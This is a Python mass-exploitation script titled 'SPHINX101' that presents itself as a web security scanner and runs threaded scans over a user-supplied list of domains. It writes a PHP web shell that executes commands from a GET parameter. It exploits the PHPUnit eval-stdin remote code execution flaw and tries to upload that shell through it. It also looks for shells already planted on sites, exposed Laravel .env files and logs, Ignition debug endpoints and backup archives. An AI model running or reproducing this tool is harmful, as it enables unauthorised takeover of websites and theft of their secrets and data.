#!/usr/bin/env python3
import os
import time
import socket
import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime

# Konfigurasi
urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
init(autoreset=True)

class WebSecurityScanner:
    def __init__(self):
        self.results_dir = "results"
        self.payload_dir = "payloads"
        self.shell_payload = "<?php echo shell_exec($_GET['cmd']); ?>"
        self.setup_directories()
        self.scan_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def setup_directories(self):
        """Membuat direktori yang diperlukan"""
        os.makedirs(self.results_dir, exist_ok=True)
        os.makedirs(self.payload_dir, exist_ok=True)
        self.create_shell_payload()
        
    def create_shell_payload(self):
        """Membuat file payload jika belum ada"""
        payload_path = os.path.join(self.payload_dir, "shell.php")
        if not os.path.exists(payload_path):
            with open(payload_path, 'w') as f:
                f.write(self.shell_payload)
    
    def save_found_result(self, vulnerability_type, result):
        """Menyimpan hanya hasil FOUND/SHELL UPLOADED"""
        filename = f"{vulnerability_type.lower().replace(' ', '_')}_found_{self.scan_id}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        with open(filepath, 'a') as f:
            f.write(result + "\n")
    
    def show_header(self):
        """Menampilkan header program"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + r"""
     ____  ____  _   _ ___ _   ___  ___  ___  _ 
    / ___||  _ \| | | |_ _| \ | \ \/ / |/ _ \/ |
    \___ \| |_) | |_| || ||  \| |\  /| | | | | |
     ___) |  __/|  _  || || |\  |/  \| | |_| | |
    |____/|_|   |_| |_|___|_| \_/_/\_\_|\___/|_|
        """)
        print(Fore.YELLOW + "SPHINX101.GOV.ID")
        print(Fore.RED + "IF YOU'RE STILL POOR WHAT DO YOU HAVE TO FEAR?")
        print(Style.RESET_ALL + "="*60)
    
    def show_menu(self):
        """Menampilkan menu utama"""
        menu_options = [
            "1. RANDOM SHELL FINDER (RSF)",
            "2. PHP UNIT RCE",
            "3. PERL ALFA RCE",
            "4. JQUERY FILE RCE",
            "5. JQUERY FILER RCE",
            "6. WORDPRESS INSTALL",
            "7. ROXY FILE MANAGER",
            "8. SFTP",
            "9. LARAVEL RCE",
            "10. LARAVEL IGNITION RCE",
            "11. RUN ALL SCANNERS",
            "12. ARCHIVES FINDER",
            "0. EXIT"
        ]
        for option in menu_options:
            print(Fore.GREEN + option)
        print(Style.RESET_ALL + "="*60)
    
    def read_domains_file(self):
        """Membaca file berisi daftar domain/URL"""
        while True:
            file_path = input("Enter path to domains file (txt): ").strip()
            if not file_path:
                print(Fore.RED + "[!] Please enter a file path")
                continue
            
            if not os.path.isfile(file_path):
                print(Fore.RED + f"[!] File not found: {file_path}")
                continue
                
            try:
                with open(file_path, 'r') as f:
                    domains = [line.strip() for line in f.readlines() if line.strip()]
                    
                if not domains:
                    print(Fore.RED + "[!] No domains found in the file")
                    continue
                    
                return domains
            except Exception as e:
                print(Fore.RED + f"[!] Error reading file: {str(e)}")
    
    def make_request(self, url, method='GET', data=None, timeout=10):
        """Membuat HTTP request dengan penanganan redirect"""
        try:
            session = requests.Session()
            session.max_redirects = 3
            session.verify = False
            
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }

            if method.upper() == 'GET':
                response = session.get(url, headers=headers, timeout=timeout)
            else:
                response = session.post(url, data=data, headers=headers, timeout=timeout)
            
            redirect_info = []
            if response.history:
                for resp in response.history:
                    redirect_info.append({
                        'url': resp.url,
                        'status': resp.status_code
                    })
            
            return {
                'response': response,
                'redirects': redirect_info,
                'final_url': response.url,
                'error': None
            }
        except Exception as e:
            return {
                'response': None,
                'redirects': [],
                'final_url': url,
                'error': str(e)
            }
    
    def is_target_valid(self, original_url, final_url):
        """Memeriksa apakah target valid (tidak ter-redirect ke path lain)"""
        # Ekstrak path dasar tanpa query parameters
        base_url = original_url.split('?')[0]
        return final_url.startswith(base_url)
    
    def check_shell(self, url):
        """Memeriksa apakah shell berhasil diupload"""
        test_url = f"{url}?cmd=echo%20SPHINX101"
        result = self.make_request(test_url)
        
        if result['response'] and result['response'].status_code == 200:
            return "SPHINX101" in result['response'].text
        return False
    
    def scan_rsf(self, domain):
        """Random Shell Finder scanner"""
        vulnerability_type = "Random Shell Finder"
        shells = [
            "/shell.php", "/cmd.php", "/r57.php",
            "/mad.php", "/c99.php", "/wso.php",
            "/b374k.php", "/upload.php"
        ]
        
        for shell in shells:
            url = f"http://{domain}{shell}" if not domain.startswith(('http://', 'https://')) else f"{domain}{shell}"
            result = self.make_request(url)
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(url, result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
                continue
                
            if result['response'] and result['response'].status_code == 200:
                if self.check_shell(url):
                    output = f"[SHELL UPLOADED] {url}"
                    print(Fore.YELLOW + output)
                    self.save_found_result(vulnerability_type, output)
                else:
                    output = f"[FOUND] {url}"
                    print(Fore.GREEN + output)
                    self.save_found_result(vulnerability_type, output)
    
    def scan_phpunit_rce(self, domain):
        """PHP Unit RCE scanner"""
        vulnerability_type = "PHP Unit RCE"
        path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        url = f"http://{domain}{path}" if not domain.startswith(('http://', 'https://')) else f"{domain}{path}"
        result = self.make_request(url)
        
        # Jika ada redirect atau target tidak valid
        if result['redirects'] or not self.is_target_valid(url, result['final_url']):
            print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
            return
            
        if result['response'] and result['response'].status_code == 200:
            # Test vulnerability
            payload = {"data": "<?php echo 'SPHINX101'; ?>"}
            exploit_result = self.make_request(url, method='POST', data=payload)
            
            if exploit_result['response'] and "SPHINX101" in exploit_result['response'].text:
                # Try to upload shell
                shell_payload = {"data": self.shell_payload}
                shell_result = self.make_request(url, method='POST', data=shell_payload)
                
                if shell_result['response'] and shell_result['response'].status_code == 200:
                    output = f"[SHELL UPLOADED] {url}"
                    print(Fore.YELLOW + output)
                    self.save_found_result(vulnerability_type, output)
                else:
                    output = f"[FOUND] PHPUnit RCE vulnerable at {url}"
                    print(Fore.GREEN + output)
                    self.save_found_result(vulnerability_type, output)
            else:
                output = f"[FOUND] PHPUnit RCE endpoint at {url}"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
    
    def scan_wordpress_install(self, domain):
        """WordPress Install scanner"""
        vulnerability_type = "WordPress Install"
        endpoints = [
            "/wp-admin/install.php", "/wp-config-sample.php",
            "/wp-admin/setup-config.php"
        ]
        
        for endpoint in endpoints:
            url = f"http://{domain}{endpoint}" if not domain.startswith(('http://', 'https://')) else f"{domain}{endpoint}"
            result = self.make_request(url)
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(url, result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
                continue
                
            if result['response'] and result['response'].status_code == 200:
                output = f"[FOUND] WordPress install at {url}"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
    
    def scan_roxy_file_manager(self, domain):
        """Roxy File Manager scanner"""
        vulnerability_type = "Roxy File Manager"
        endpoints = [
            "/filemanager", "/roxy-file-manager",
            "/filemanager/dialog.php", "/filemanager/upload.php"
        ]
        
        for endpoint in endpoints:
            url = f"http://{domain}{endpoint}" if not domain.startswith(('http://', 'https://')) else f"{domain}{endpoint}"
            result = self.make_request(url)
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(url, result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
                continue
                
            if result['response'] and result['response'].status_code == 200:
                output = f"[FOUND] Roxy File Manager at {url}"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
                
                # Check if shell exists
                shell_url = f"{url}../files/shell.php"
                if self.check_shell(shell_url):
                    shell_output = f"[SHELL UPLOADED] {shell_url}"
                    print(Fore.YELLOW + shell_output)
                    self.save_found_result(vulnerability_type, shell_output)
    
    def scan_sftp(self, domain):
        """SFTP scanner"""
        vulnerability_type = "SFTP"
        clean_domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
        
        try:
            # Check port 22
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((clean_domain, 22))
            
            if result == 0:
                output = f"[FOUND] SFTP/SSH open on {clean_domain}:22"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Checking SFTP on {clean_domain}: {str(e)}")
    
    def scan_laravel_rce(self, domain):
        """Laravel RCE scanner"""
        vulnerability_type = "Laravel RCE"
        endpoints = [
            "/.env", "/storage/logs/laravel.log",
            "/vendor/", "/index.php"
        ]
        
        for endpoint in endpoints:
            url = f"http://{domain}{endpoint}" if not domain.startswith(('http://', 'https://')) else f"{domain}{endpoint}"
            result = self.make_request(url)
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(url, result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
                continue
                
            if result['response'] and result['response'].status_code == 200:
                if endpoint == "/.env" and "APP_KEY=" in result['response'].text:
                    output = f"[FOUND] Laravel .env exposed at {url}"
                    print(Fore.GREEN + output)
                    self.save_found_result(vulnerability_type, output)
                elif endpoint == "/storage/logs/laravel.log":
                    output = f"[FOUND] Laravel logs exposed at {url}"
                    print(Fore.GREEN + output)
                    self.save_found_result(vulnerability_type, output)
                elif endpoint == "/vendor/":
                    output = f"[FOUND] Laravel vendor directory at {url}"
                    print(Fore.GREEN + output)
                    self.save_found_result(vulnerability_type, output)
    
    def scan_laravel_ignition_rce(self, domain):
        """Laravel Ignition RCE scanner"""
        vulnerability_type = "Laravel Ignition RCE"
        url = f"{domain}" if not domain.startswith(('http://', 'https://')) else domain
        try:
            result = self.make_request(f"{url}/_ignition/execute-solution")
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(f"{url}/_ignition/execute-solution", result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url}/_ignition/execute-solution (redirected or invalid target)")
                return
                
            if result['response'] and result['response'].status_code == 405:
                output = f"[FOUND] Laravel Ignition debug enabled at {url}"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
                
                # Simulate potential exploitation
                exploit_output = f"[POTENTIAL] Laravel Ignition RCE possible at {url}"
                print(Fore.YELLOW + exploit_output)
                self.save_found_result(vulnerability_type, exploit_output)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Checking Laravel Ignition on {domain}: {str(e)}")
    
    def scan_archives_finder(self, domain):
        """Archives Finder scanner"""
        vulnerability_type = "Archives Finder"
        archives = [
            "/backup.zip", "/archive.rar", "/database.tar.gz",
            "/backup.sql", "/www.bak", "/site.7z"
        ]
        
        for archive in archives:
            url = f"http://{domain}{archive}" if not domain.startswith(('http://', 'https://')) else f"{domain}{archive}"
            result = self.make_request(url)
            
            # Jika ada redirect atau target tidak valid
            if result['redirects'] or not self.is_target_valid(url, result['final_url']):
                print(Fore.RED + f"[NOT VALID] {url} (redirected or invalid target)")
                continue
                
            if result['response'] and result['response'].status_code == 200 and int(result['response'].headers.get('content-length', 0)) > 0:
                output = f"[FOUND] Archive file at {url}"
                print(Fore.GREEN + output)
                self.save_found_result(vulnerability_type, output)
    
    def run_all_scanners(self, domain):
        """Run all scanners against a domain"""
        scanners = [
            self.scan_rsf,
            self.scan_phpunit_rce,
            self.scan_wordpress_install,
            self.scan_roxy_file_manager,
            self.scan_sftp,
            self.scan_laravel_rce,
            self.scan_laravel_ignition_rce,
            self.scan_archives_finder
        ]
        
        for scanner in scanners:
            scanner(domain)
    
    def main(self):
        """Main program function"""
        self.show_header()
        self.show_menu()
        
        while True:
            try:
                choice = input("\nSelect an option (0-12): ").strip()
                
                if choice == '0':
                    print(Fore.YELLOW + "\nExiting SPHINX101 Web Security Scanner...")
                    break
                    
                if not choice.isdigit() or int(choice) < 0 or int(choice) > 12:
                    print(Fore.RED + "\nInvalid option! Please select 0-12")
                    continue
                    
                domains = self.read_domains_file()
                if not domains:
                    continue
                    
                option = int(choice)
                start_time = time.time()
                
                print(Fore.CYAN + f"\nStarting scan for {len(domains)} domains...")
                print(Fore.CYAN + f"Found results will be saved in: {os.path.abspath(self.results_dir)}")
                
                if option == 1:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_rsf, domains)
                elif option == 2:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_phpunit_rce, domains)
                elif option == 6:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_wordpress_install, domains)
                elif option == 7:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_roxy_file_manager, domains)
                elif option == 8:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_sftp, domains)
                elif option == 9:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_laravel_rce, domains)
                elif option == 10:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_laravel_ignition_rce, domains)
                elif option == 11:
                    with ThreadPoolExecutor(max_workers=5) as executor:
                        executor.map(self.run_all_scanners, domains)
                elif option == 12:
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        executor.map(self.scan_archives_finder, domains)
                
                elapsed_time = time.time() - start_time
                print(Fore.CYAN + f"\nScan completed in {elapsed_time:.2f} seconds")
                print(Fore.CYAN + f"Found results saved in: {os.path.abspath(self.results_dir)}")
                
            except KeyboardInterrupt:
                print(Fore.RED + "\nScan interrupted by user")
                break
            except Exception as e:
                print(Fore.RED + f"\nAn error occurred: {str(e)}")

if __name__ == "__main__":
    scanner = WebSecurityScanner()
    scanner.main()